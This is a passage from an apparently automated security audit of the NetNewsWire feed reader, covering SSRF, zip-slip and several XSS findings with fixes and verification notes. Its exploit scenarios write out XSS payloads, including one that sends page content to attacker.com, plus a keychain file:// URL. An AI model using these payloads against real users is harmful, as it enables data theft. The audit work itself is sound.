- **Primary (SSRF)**: Attacker crafts `netnewswire://theme/add?url=http://192.168.1.1/admin`. After one tap + confirm, the victim device makes a GET from its network interface to the internal resource. Response body lands in a local temp file (blind SSRF — attacker does not receive it). Side effects: device's IP and User-Agent are logged if URL points to attacker-controlled redirect, and internal services are reachable that aren't from the internet.
- **Secondary (drive-by malicious theme + zip-slip)**: Attacker hosts `https://attacker.com/evil.zip` containing both a `.nnwtheme` file and entries with `../../` path components. Files are written to the app sandbox, potentially overwriting cached data or WKWebView resources.

### 9. [MEDIUM] Unvalidated URL in theme URL-scheme handler enables arbitrary download
**Class:** CWE-918: Server-Side Request Forgery (SSRF)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF) - https://cwe.mitre.org/data/definitions/918.html
**File:** `Mac/Scripting/AppDelegate+Scriptability.swift:56-79`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.83 (1 run agreed)

#### Description
In getURL(_:_:), the raw URL string arrives from the Apple Event's direct object parameter (line 51) without any trust boundary. When the string begins with 'netnewswire://theme', the code extracts the 'url' query parameter into themeURLString (line 59) and immediately passes it to URL(string:) (line 63) and then to URLRequest(url:) (line 64). URLSession.shared.downloadTask is then called with that request (line 65) and the downloaded file location is forwarded verbatim to ArticleThemeDownloader.shared.handleFile(at:) (line 72). There is no scheme restriction (http/https/file/data are all permitted by Foundation), no host allowlist, and no sandbox boundary check anywhere between the attacker-supplied value and the network fetch. The file:// scheme is particularly notable: Foundation's URLSession handles file:// download tasks by copying the referenced path to a tmp location, which then passes the contents of any user-readable local file into the theme processor.

#### Impact
An attacker who tricks a user into clicking a crafted netnewswire:// link causes NetNewsWire to download and process content from any attacker-chosen URL — including file:// references to local files — as an article theme. The downloaded payload is handed directly to ArticleThemeDownloader.handleFile; if that handler processes archive formats (e.g. ZIP), a crafted payload may trigger path traversal or other secondary vulnerabilities against the user's account.

#### Exploit scenario
1) Attacker hosts a malicious payload at https://evil.example.com/evil.nnwtheme. 2) Attacker delivers the link netnewswire://theme?url=https://evil.example.com/evil.nnwtheme via a web page or email. 3) macOS shows a single 'Open in NetNewsWire?' dialog; victim clicks OK. 4) NetNewsWire fetches the payload with no TLS pinning or host validation and passes it to ArticleThemeDownloader.handleFile. For local file exfiltration the URL is netnewswire://theme?url=file:///Users/victim/Library/Keychains/login.keychain-db — URLSession copies the file to a temp path and handleFile attempts to parse it as a theme.

#### Preconditions
- Victim is running NetNewsWire on macOS
- Victim clicks a crafted netnewswire:// URL (browser presents a single OS-level confirmation dialog)

```
if let themeURL = URL(string: themeURLString) {
    let request = URLRequest(url: themeURL)   // no scheme or host validation
    let task = URLSession.shared.downloadTask(with: request) { location, _, error in
        guard let location = location else { return }
        Task { @MainActor in
            do {
                try ArticleThemeDownloader.shared.handleFile(at: location)
            } catch { ... }
        }
    }
    task.resume()
}
```

#### How to fix
Immediately after URL(string: themeURLString) at line 63, enforce: guard let scheme = themeURL.scheme?.lowercased(), scheme == "https" else { return }. Additionally consider an allowlist of trusted theme distribution hosts. This ensures only HTTPS downloads from known origins are accepted, eliminating file://, http://, and arbitrary-host vectors.

**Exploitability:** macOS AppleScript/URL-scheme handler for netnewswire://theme has the identical unvalidated URL download flaw as finding 0, additionally permitting file:// (Foundation URLSession copies any user-readable local file into the theme processor). CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Shares the zip-slip chain entry with finding 0.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — attacker-controlled URL reaches `URLSession.downloadTask` and `Zip.unzipFile` with no scheme/host validation; zip-slip writes within the sandbox container occur before any in-app confirmation dialog; `NSAllowsArbitraryLoads: true` allows plain-HTTP delivery; the `file://` exfiltration claim is overstated but the drive-by download + sandbox-scoped zip-slip chain is real.

Now I have all the facts I need. Let me synthesize.

---

**Analysis**

**A. What the code actually does (lines 56–79)**

`getURL(_:_:)` is the Apple Event handler for `kInternetEventClass/kAEGetURL`, registered at line 46. When the `netnewswire://theme` scheme is opened in any browser, macOS routes the event here. The handler extracts the `url` query parameter from the incoming URL string with **no scheme or host validation**, constructs a `URLRequest`, and fires a `URLSession.shared.downloadTask`. The downloaded file is passed to `ArticleThemeDownloader.shared.handleFile(at:)`.

**B. External entry point confirmed**

The `netnewswire` URL scheme is registered in `Info.plist` (line 38). Any webpage or email can craft `netnewswire://theme?url=https://attacker.example/evil.nnwtheme`. The user sees one macOS "Open in NetNewsWire?" dialog. That is the only OS-level gate.

**C. Looking for defences — what I found**

| Defence | Present? |
|---|---|
| Scheme allowlist (https only) | **No** — `URL(string:)` accepts any scheme |
| Host allowlist | **No** |
| ATS restriction | **No** — `NSAllowsArbitraryLoads: true` in Info.plist (line 58) |
| In-app Install Theme confirmation | **Yes, but…** |

The *in-app* confirmation dialog (lines 933–966 in `AppDelegate.swift`) shows "Install theme X by Y?" before copying the theme to the themes folder. However, this dialog fires **after** `handleFile(at:)` has already completed: the zip was already downloaded, renamed, and extracted by `Zip.unzipFile()`. Any **zip-slip writes** occur before the user sees the second dialog.

**D. Probing the defences — what slips through**

1. **Zip-slip before confirmation**: `Zip.unzipFile()` is called with `overwrite: true` and no path-traversal check. A crafted zip with `../../` entry paths can write files outside `Application Support/NetNewsWire/Downloads` — but is bounded by the **App Sandbox** (`com.apple.security.app-sandbox: true` in entitlements). Within the sandbox container the attacker can overwrite account data, SQLite databases, and preferences without any user confirmation.

2. **Malicious theme JS** (requires the user to also click the in-app "Install Theme" button): A `.nnwtheme` bundle can contain arbitrary CSS/JS that executes inside the WKWebView rendering every article. This is a second-user-action barrier, but trivially cleared by social engineering given the attacker controls the theme name/author shown in the dialog.

3. **`file://` exfiltration is overstated**: URLSession handles `file://` download tasks by copying the referenced file to a temp path, then `unzipFile` fails on non-zip binary content and the exception is caught silently. No data reaches the attacker remotely — this sub-scenario does not materialise as described.

**Net verdict**: The external entry point is confirmed. The URL is attacker-controlled with no scheme/host restriction. Zip-slip writes happen within the sandbox before any second confirmation. The malicious-JS theme path requires two user clicks but remains socially engineerable.

---

### 10. [MEDIUM] Feed author names/emails injected unescaped into WKWebView HTML
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Shared/Article Rendering/ArticleRenderer.swift:279-302`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)
**Also at:** `Themes/Hyperlegible.nnwtheme/template.html:36`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
In byline() (ArticleRenderer.swift:279–306), author.name and author.emailAddress values sourced from remote feed data are concatenated directly into an HTML string with no escaping. Three distinct unprotected paths exist: (1) Line 291: if author.emailAddress contains a space it is appended raw — 'byline += emailAddress' — with the comment 'probably name plus email address', making any space-containing email field a direct injection point. (2) Line 295: author.name is interpolated with no escaping into '"\(name) &lt;\(emailAddress)&gt;"' — only the surrounding angle brackets are escaped, not the name itself. (3) Lines 296–297: when only a name is present, 'byline += name' appends it with zero sanitization. The assembled byline is placed into d["byline"] at line 246 and MacroProcessor substitutes it verbatim into template.html line 36: '<a class="feedlink" href="[[feed_link]]">[[feed_link_title]]</a><br />[[byline]]'. There is no Content-Security-Policy in the template, so inline event-handler attributes execute immediately. Compare: article.title IS sanitized at line 112 via ArticleStringFormatter.sanitizedTitle(_:forHTML:), confirming the team knew HTML escaping was needed for metadata — but author names and feed names were missed.

#### Impact
A malicious or compromised RSS/Atom feed can inject arbitrary HTML and JavaScript into the article detail WKWebView. Because the app registers WKScriptMessageHandlers (evidenced by userContentController(_:didReceive:) being a listed entry point), injected JavaScript can invoke native app code. Every subscriber who opens any article from the feed is silently exploited.

#### Exploit scenario
Attacker publishes an Atom feed whose <author><name> is '<img src=x onerror="window.webkit.messageHandlers.scriptMessageHandler.postMessage({action:'openURL',url:'file:///etc/passwd'})">'. When any subscriber views an article, ArticleRenderer.byline() appends this string to the HTML header (line 297) and MacroProcessor embeds it in the page. The WKWebView renders the img, the onerror fires synchronously, and the postMessage call reaches the native userContentController handler. No user interaction beyond viewing the article is needed.

#### Preconditions
- Attacker controls or can compromise a feed server that serves RSS/Atom/JSON Feed content
- At least one NetNewsWire user subscribes to the feed and opens an article from it

```
if let emailAddress = authorEmailAddress, emailAddress.contains(" ") {
    byline += emailAddress // probably name plus email address
} else if let name = author.name, let url = author.url {
    byline += name.htmlByAddingLink(url)
} else if let name = author.name, let emailAddress = authorEmailAddress {
    byline += "\(name) &lt;\(emailAddress)&gt;"
} else if let name = author.name {
    byline += name
}
```

#### How to fix
HTML-escape all feed-derived string metadata before concatenating it into HTML context. Apply a .htmlEscaped() (or equivalent) transformation to author.name and author.emailAddress in byline() before any concatenation. Additionally, validate that author.url has an http or https scheme before passing it to htmlByAddingLink(), since that call at line 293 places an attacker-controlled URL into an href attribute without scheme validation. The pattern in Article.baseURL (ArticleRenderer.swift:346) already performs this scheme check and should be reused.

**Exploitability:** Feed-supplied author names and email addresses are concatenated unescaped into byline HTML rendered verbatim in WKWebView. An attacker-controlled feed can inject inline event handlers (onerror=, onmouseover=) that execute JS in the WKWebView context. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Team knew HTML escaping was needed (article titles use sanitizedTitle) but missed author fields.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — author.name/emailAddress from remote feeds is injected unescaped into WKWebView HTML; JavaScript enabled by default; no CSP; specific PoC handler is wrong but XSS is confirmed real

I now have all the evidence needed. Let me summarize the investigation:

---

**Investigation Results**

**A. Source Confirmed (lines 279–306)**
The `byline()` function is exactly as the scanner described. Three unescaped paths:
- **Line 291**: `byline += emailAddress` — raw string from feed
- **Line 293**: `byline += name.htmlByAddingLink(url)` — `htmlByAddingLink` wraps `self` directly: `"<a href=\"\(link)\">\(self)</a>"` with no HTML-encoding of the name
- **Line 295–297**: `byline += "\(name) &lt;\(emailAddress)&gt;"` and `byline += name` — name unescaped in both branches

This byline is substituted verbatim at `template.html` line 36 inside `<td class="header leftAlign">`.

**B. Data Flow to External Entry Point**
`author.name` / `author.emailAddress` originate from parsed RSS/Atom/JSON Feed data over the network → stored in the `Articles` database → retrieved at render time → inserted into HTML → loaded in WKWebView via `loadHTMLString`. No authentication gate protects this path; any subscriber to any feed triggers it on article view.

**C. Defence Search**
- **No CSP**: Confirmed by exhaustive grep across the entire repo — zero `Content-Security-Policy` occurrences, zero CSP meta tags in any page template (checked `page.html` for Mac and iOS, `template.html`, all theme templates).
- **JavaScript enabled by default**: Both `iOS/AppDefaults.swift:401` and `Mac/AppDefaults.swift:347` explicitly register `Key.articleContentJavascriptEnabled: true` as the default. `WKWebpagePreferences.allowsContentJavaScript` is set to this value — so inline event handlers (`onerror`, etc.) fire out of the box for all new installations.
- **No input sanitisation for byline**: `sanitizedTitle()` is used for article titles (line 112) but bypassed entirely for author metadata. `htmlByAddingLink` (RSCore) does zero HTML-encoding.

**D. Probing the Claimed Exploit Scenario**
The scanner's exploit uses `window.webkit.messageHandlers.scriptMessageHandler` — **this handler does not exist**. Actual handlers:
- **Mac**: `windowDidScroll`, `mouseDidEnter`, `mouseDidExit` — benign (scroll state / status-bar hover)
- **iOS**: `imageWasClicked`, `imageWasShown`, `showFeedInspector` — `imageWasClicked` triggers `Downloader.shared.download(imageURL)` for an attacker-supplied URL, enabling arbitrary network beaconing from the app

The specific "read file:///etc/passwd" scenario is impossible. However, the XSS is real and meaningful: with JavaScript enabled (the default), injected code can (1) exfiltrate article HTML context, (2) forge fake UI elements in the article pane (phishing), and (3) use `imageWasClicked` to beacon arbitrary URLs through the app's native networking stack (same process / same network as authenticated feed-sync credentials). The wrong handler name in the scanner's PoC does not negate the underlying injection flaw; it only limits the impact compared to the description.

**Verdict**: TRUE_POSITIVE. The injection is confirmed, JavaScript is on by default, no CSP exists, and an attacker who controls a feed can execute JavaScript in the article WKWebView for every subscriber who opens an article — requiring only that the user subscribe and view an article.

### 11. [MEDIUM] Unescaped HTML injection in htmlByAddingLink utility
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Modules/RSCore/Sources/RSCore/String+RSCore.swift:16-21`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
The public String extension method `htmlByAddingLink(_:className:)` and the static wrapper `htmlWithLink(_:)` construct HTML anchor tags by direct Swift string interpolation with no HTML encoding of any parameter:

```swift
return "<a class=\"\(className)\" href=\"\(link)\">\(self)</a>"
return "<a href=\"\(link)\">\(self)</a>"
```

All three dynamic values — `link` (the href), `className` (the CSS class attribute), and `self` (the visible link text) — are inserted raw. Feed-derived content (article link URLs, feed titles, source names) are untrusted and travel through the Account layer before being passed to rendering helpers that call these methods. Because the RSS/Atom parser accepts arbitrary string values from remote servers, an attacker-controlled feed can supply:
- A `link` value containing `javascript:attackerCode()` — which survives as a valid href and fires when the rendered anchor is activated.
- A `link` value containing `" onmouseover="attackerCode()` — which breaks out of the href attribute and adds an event handler.
- A `self` value (e.g., feed source name, article title) containing `<img src=x onerror=attackerCode()>` — which is inserted as raw HTML between the `<a>` tags.

The resulting HTML string is subsequently loaded into the article-rendering WKWebView (template-based HTML pipeline). No sanitization layer sits between the sink here and the WebView's HTML loader.

#### Impact
A malicious RSS feed can supply a crafted link URL (e.g., javascript: URI or attribute-breaking string) or a title string containing raw HTML. Because no escaping is applied, the resulting anchor tag is injected verbatim into HTML that is rendered inside WKWebView, allowing arbitrary JavaScript execution in the WebView context and enabling calls into native WKScriptMessageHandler endpoints.

#### Exploit scenario
An attacker hosts an RSS feed whose `<link>` element contains the value `javascript:window.webkit.messageHandlers.contentView.postMessage({type:'openURL',url:'file:///etc/passwd'})`. A user subscribes to this feed in NetNewsWire. When the article is rendered, `htmlByAddingLink` embeds the unescaped value directly into the anchor href. The WKWebView renders an anchor tag with a `javascript:` href. If the user clicks the link (or if the article template auto-activates it), the JavaScript executes in the WebView context and posts a crafted message to the registered native message handler, potentially triggering privileged application-side behaviour.

#### Preconditions
- User subscribes to an attacker-controlled RSS/Atom feed, or the feed is fetched over HTTP and the network path can be MITMed.
- The calling code passes the feed-derived link/title directly to htmlByAddingLink (the common use case in the article rendering pipeline).
- The resulting HTML is loaded into the article-rendering WKWebView.

```
func htmlByAddingLink(_ link: String, className: String? = nil) -> String {
	if let className = className {
		return "<a class=\"\(className)\" href=\"\(link)\">\(self)</a>"
	}
	return "<a href=\"\(link)\">\(self)</a>"
}
```

#### How to fix
Enforce HTML encoding at the sink: escape `<`, `>`, `&`, `"`, and `'` in all three dynamic parameters before interpolation. The codebase already provides `escapingSpecialXMLCharacters` on String (same file, line 288) which covers the four XML-critical characters; apply it to every argument passed to these methods. Additionally, reject or percent-encode `javascript:` and `data:` schemes in the `link` parameter before inserting them as href values. The fix must be applied inside `htmlByAddingLink` itself, not at individual call sites, so future callers are protected automatically.

**Exploitability:** htmlByAddingLink constructs HTML anchors via raw Swift string interpolation with no encoding for href, className, or link text. All three are feed-derived: javascript: href, attribute-break via quote in className, or raw HTML tags in text. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Used throughout the rendering pipeline that populates WKWebView.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — confirmed stored XSS via unescaped feed author name/URL inserted into article-viewer WKWebView; auto-fires via `onerror` without user click; no sanitization on either call site; JS enabled by default

I now have all the evidence I need. Let me complete the analysis.

**Key findings:**

**A. Sink confirmed**: Lines 16–21 of `String+RSCore.swift` do raw string interpolation of all three values — no encoding.

**B. Call chain traced to external entry point**:
- `author.name` and `author.url` come from parsed RSS/Atom feed data (network-controlled)
- `ArticleRenderer.byline()` line 293 calls `name.htmlByAddingLink(url)` with raw feed author fields
- The byline is placed into the template substitution dict (`d["byline"] = byline()`)
- Template rendered via `MacroProcessor.renderedText()` and loaded into WKWebView via `webView.loadHTMLString(html, baseURL:...)` on both platforms
- Full path: attacker RSS feed → RSParser → Article.authors → ArticleRenderer.byline() → HTML → loadHTMLString → WKWebView

**C. Defence probe**:
- `escapingSpecialXMLCharacters` exists in the same file but is **not** called before either `htmlByAddingLink` invocation
- JavaScript is **enabled by default** on both platforms (`Key.articleContentJavascriptEnabled: true`)
- Mac `decidePolicyFor`: cancels `.linkActivated` navigation — mitigates the bare `javascript:` href scenario (link click is blocked, but attribute injection still works)
- iOS `decidePolicyFor`: only handles `http/https/mailto/tel` — unknown schemes like `javascript:` fall to `decisionHandler(.allow)`. Modern WebKit additionally blocks `javascript:` navigation at the engine level, but **event-handler injection** (`onmouseover`, `onerror`) is entirely unaffected by both policies
- No URL-scheme allowlist exists before the URL is embedded in the `href`

**D. Effective attacks**:
1. `author.url = 'https://x.com" onmouseover="evil()'` → attribute breakout adds event handler → fires when JS-enabled WebView renders the article
2. `author.name = '<img src=x onerror="evil()">'` → auto-fires `onerror` on article load **without any user click**
3. These deliver stored XSS in the WKWebView context

**Limits on impact**: The WKWebView sandbox prevents filesystem access. The registered message handlers are benign (scroll sync, image viewer, feed inspector). The XSS cannot reach the Keychain or other app data. Real-world impact is: auto-executing JS that can manipulate the article DOM, exfiltrate visible article content to a remote server, or trigger the feed-inspector/image-viewer via message handlers.

### 12. [MEDIUM] DOM-XSS via innerHTML of feed-controlled footnote content
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Shared/Article Rendering/newsfoot.js:39-47`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
Data flow: (1) The RSS feed body is inserted as raw HTML into `<div id="bodyContainer">` via the `[[body]]` template variable. (2) newsfoot.js listens for clicks on `.footnote` anchor elements. (3) At line 124, `idFromHash()` extracts and URI-decodes the anchor's hash fragment — a value fully controlled by the feed author. (4) At line 149, `document.getElementById(targetId)` retrieves the corresponding footnote element, whose content is entirely feed-supplied HTML. (5) At line 156, `targetElement.innerHTML` — the raw, unsanitized inner HTML — is passed as `content` to `footnoteMarkup()`. (6) Inside `footnoteMarkup()`, line 45 performs `inner.innerHTML = content`, which re-parses the feed HTML and creates new DOM nodes. Creating new nodes from HTML containing attributes like `onerror`, `onload`, `onmouseover`, etc. causes those handlers to fire immediately (e.g., a new `<img src=x onerror=...>` triggers `onerror`). Unlike static `<script>` tags (which browsers do not re-execute when inserted via innerHTML), event-handler attributes on dynamically created elements execute unconditionally, even under a `script-src 'none'` CSP that blocks `<script>` elements.

#### Impact
A malicious RSS feed can craft footnote HTML containing inline event handlers (onerror, onload, etc.). When a user clicks a footnote reference link, newsfoot.js copies the raw innerHTML of the footnote element into a newly created popover div via innerHTML, re-parsing and re-triggering those handlers. Because the native WKWebView message-handler bridge (userContentController) is reachable from JavaScript, this could let a remote feed operator post arbitrary messages to the native Swift layer.

#### Exploit scenario
An attacker publishes an Atom feed whose `<content>` contains: `<div id="fn1"><img src="x" onerror="window.webkit.messageHandlers.controller.postMessage({action:'openURL',url:'file:///etc/passwd'})"></div><sup><a href="#fn1" class="footnote">1</a></sup>`. The user subscribes, opens an article, and clicks the footnote superscript. newsfoot.js copies `targetElement.innerHTML` (the img tag) into a new popover div via `innerHTML`; the browser parses a fresh `<img>` element with the onerror handler and fires it immediately, posting a native message to the Swift bridge.

#### Preconditions
- Attacker controls an RSS/Atom feed the victim has subscribed to
- Victim clicks a footnote reference link rendered in the article detail view

```
function footnoteMarkup(content) {
	const popover = newEl("div", POPOVER_CLS);
	const arrow = newEl("div", POPOVER_ARROW_CLS);
    const inner = newEl("div", POPOVER_INNER_CLS);
	popover.appendChild(inner);
	popover.appendChild(arrow);
	inner.innerHTML = content;   // <-- feed-controlled HTML injected here
	return popover;
}

// ...
void new Footnote(targetElement.innerHTML, ev.target);  // source: feed DOM element
```

#### How to fix
Replace the `inner.innerHTML = content` assignment with DOM-safe construction. Use a DOMParser or a vetted sanitizer (e.g., DOMPurify) to strip event-handler attributes from `content` before injection, or copy only the text content of the footnote element (`targetElement.textContent`) when footnotes are expected to be plain text. At minimum, strip all `on*` attributes and `javascript:` hrefs from the content before assigning it to innerHTML.

**Exploitability:** newsfoot.js assigns feed-supplied footnote innerHTML to a newly created element via inner.innerHTML. Event-handler attributes (onerror, onload, onmouseover) on dynamically created elements fire immediately even under a script-src CSP. No user interaction beyond viewing the article with a footnote link. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — feed-controlled HTML is re-injected via `innerHTML` in `footnoteMarkup()` with no sanitization and no CSP; JavaScript is on by default; attacker-controlled event-handler attributes fire on user footnote click; specific `controller` handler in exploit scenario does not exist but real JS execution + limited native bridge access is achievable

Now I have enough information to make a complete assessment. Let me synthesize the findings.

**Verification Summary:**

**A. Code confirmed:** `newsfoot.js` lines 45 and 156 are exactly as described. `inner.innerHTML = content` where content is `targetElement.innerHTML` — content derived from feed-supplied HTML inserted via the `[[body]]` template into `<div id="bodyContainer">`.

**B. Entry point confirmed:** Feed authors fully control `<content>` in Atom/RSS. Body is inserted raw (no HTML sanitization) in `ArticleRenderer.swift` line 222 (`d["body"] = body`). This is a live external entry point.

**C. Defences examined:**
- **No CSP** — `template.html` has no Content-Security-Policy meta tag; `WebViewConfiguration.swift` sets no CSP header. Event-handler attributes on dynamically-created DOM nodes will fire.
- **JavaScript enabled by default** — Both `iOS/AppDefaults.swift` line 401 and `Mac/AppDefaults.swift` line 347 set `articleContentJavascriptEnabled: true`.
- **No sanitization** of `targetElement.innerHTML` before passing to `footnoteMarkup()`.
- **newsfoot.js injected as WKUserScript** (line 122, `WebViewConfiguration.swift`) — runs regardless of the content-JS toggle, which only controls `<script>` tags in the article body.

**D. Claimed exploit scenario is partially wrong:**
The scanner posits calling `window.webkit.messageHandlers.controller.postMessage(...)`. No `controller` handler exists. Actual iOS handlers: `imageWasClicked`, `imageWasShown`, `showFeedInspector`; Mac handlers: `windowDidScroll`, `mouseDidEnter`, `mouseDidExit`. The `imageWasClicked` handler downloads an attacker-supplied URL (SSRF) and attempts to display it as an image — a real but limited-impact bridgehead. The `file:///etc/passwd` read scenario is not executable via registered handlers.

**Net verdict:** The DOM-XSS itself is confirmed real — arbitrary JavaScript execution inside the app's WKWebView upon a user clicking a footnote link. The native bridge is accessible but exposes only limited capabilities (no open-URL-as-file handler, no shell access). Impact is moderate: JS execution in app context, SSRF via `imageWasClicked`, potential WebView navigation hijack; no direct filesystem disclosure.

### 13. [MEDIUM] Unescaped feed article body rendered as raw HTML enables XSS
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Themes/Hyperlegible.nnwtheme/template.html:46-46`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)
**Also at:** `Themes/Promenade.nnwtheme/template.html:45`, `Themes/Sepia.nnwtheme/template.html:14`, `Themes/Biblioteca.nnwtheme/template.html:14-16`

*3 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
Line 46 substitutes [[body]] directly into a <div> element with no HTML encoding or sanitization at the template level. The template comment documents this variable as 'The body of the article', which is populated from remote feed content fetched by LocalAccountRefresher. RSS and Atom feeds explicitly support HTML-formatted bodies; a malicious feed author can place <script> tags, inline event handlers (onerror=, onload=), or other executable HTML in the article body element. When NetNewsWire renders the article, the malicious HTML executes inside WKWebView. The app's registered JavaScript message handlers then become reachable from the injected script via window.webkit.messageHandlers.*.

#### Impact
A malicious or compromised RSS/Atom/JSON feed can inject arbitrary HTML and JavaScript into the WKWebView used to display articles. Because NetNewsWire registers a WKScriptMessageHandler bridge (evidenced by the userContentController entry points in the trust context), attacker-injected JavaScript can invoke native Swift handlers, potentially triggering app actions or exfiltrating displayed article content.

#### Exploit scenario
An attacker publishes an Atom feed whose entry content is: '<img src=x onerror="window.webkit.messageHandlers.netnewswire.postMessage({action:\"openURL\",url:\"https://attacker.com/?d=\"+encodeURIComponent(document.body.innerHTML)})">'. A user subscribes; when NetNewsWire displays the article the onerror handler fires immediately, sending rendered page content to the attacker's endpoint and/or invoking whatever native action the registered handler supports.

#### Preconditions
- User subscribes to an attacker-controlled or MITM-compromised feed
- The Swift code populating [[body]] does not perform an HTML sanitization pass (allow-list of safe tags/attributes) before template substitution

```
<div id="bodyContainer" class="articleBody [[text_size_class]]">[[body]]</div>
```

#### How to fix
Apply an HTML allow-list sanitizer (stripping <script>, event-handler attributes, data: URIs, etc.) to article body content before it is inserted into the template. Additionally, serve the WKWebView content with a Content-Security-Policy header that forbids inline scripts (script-src 'none' or a nonce-based policy) to provide defence-in-depth even if individual variables are sanitized.

**Exploitability:** Hyperlegible theme substitutes [[body]] (raw feed HTML) directly into a div. Malicious article bodies containing <script> or event-handler attributes execute in WKWebView. CVSS 6.1. Common rendering path for all articles in this theme; confirmed JS execution context via registered message handlers.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `article.body` is provably injected into the HTML template with no sanitization, JavaScript is on by default, no CSP exists, and the execution path from an external attacker-controlled feed to WKWebView script execution is confirmed.

I now have enough evidence to deliver a complete verdict. Here's my analysis:

**Investigation Summary**

**A. What the code really does (line 46):**
`template.html:46` has `[[body]]` substituted with the raw article body, confirmed in `ArticleRenderer.swift:222`:
```swift
d["body"] = body   // body = article?.body ?? ""
```
No sanitization is applied to `body`. Compare this to title processing (`ArticleStringFormatter.sanitizedTitle(article?.title, forHTML: true)`) which runs an allowlist filter — the body receives no equivalent treatment.

**B. External entry point chain:**
`LocalAccountRefresher.refresh()` → parses feed via `RSParser` → stores raw article HTML in `article.body` → `ArticleRenderer.articleSubstitutions()` inserts it unsanitized → `MacroProcessor.renderedText()` emits it into `template.html:46` → `page.html` wraps it (no CSP header) → `webView.loadHTMLString(html, baseURL:)` renders it in WKWebView. Fully externally reachable.

**C. Defences examined:**

| Defence | Result |
|---------|--------|
| `ArticleStringFormatter.sanitizedTitle()` allowlist | **Only applied to titles**, not body |
| `ArticleRenderingSpecialCases.filterHTMLIfNeeded()` | Fixes The Verge encoding bugs only, no security filter |
| `WKPreferences.allowsContentJavaScript` | **Default is `true`** (`Key.articleContentJavascriptEnabled: true` in both `iOS/AppDefaults.swift:401` and `Mac/AppDefaults.swift:347`) |
| Content Security Policy | **None present** in `page.html` or `iOS/Resources/page.html` |
| WKURLSchemeHandler for `netnewswire://` | Not registered; custom scheme navigation impact is limited |
| WKUserScript injection | `main.js`, `main_ios.js`, `newsfoot.js` run regardless — attacker JS cannot remove them, but they don't block injected content |

**D. Attacking the defence:**  
JavaScript is on by default; a user would need to proactively disable it in Settings. `NSAllowsArbitraryLoads: true` means injected `fetch()` calls to HTTP attacker endpoints succeed without ATS blocking. The registered message handlers (`imageWasClicked`, `showFeedInspector`, Mac scroll handlers) offer limited but real native bridge access: `imageWasClicked` causes the app to download and display content from an attacker-specified `imageURL`, and `fetch()`/XHR can exfiltrate rendered page content to attacker-controlled servers.

**Impact:**  
A malicious feed author places `<script>window.webkit.messageHandlers.imageWasClicked.postMessage(...)</script>` or uses `<img onerror=...>` in the article body. When a subscribed user views the article, the script runs in WKWebView, crosses into the native layer via message handlers, and can exfiltrate article metadata via `fetch()` to the attacker's server. The sandboxed WKWebView process limits filesystem access, but data exfiltration and limited SSRF (via `imageWasClicked` download) are demonstrated.

---

### 14. [MEDIUM] Unescaped HTML in RSS metadata fields enables stored XSS
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Themes/Sepia.nnwtheme/template.html:4-13`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.70 (1 run agreed)

#### Description
The template injects several feed-supplied metadata values directly into HTML text-node and attribute positions without any visible HTML-encoding layer in the template itself:

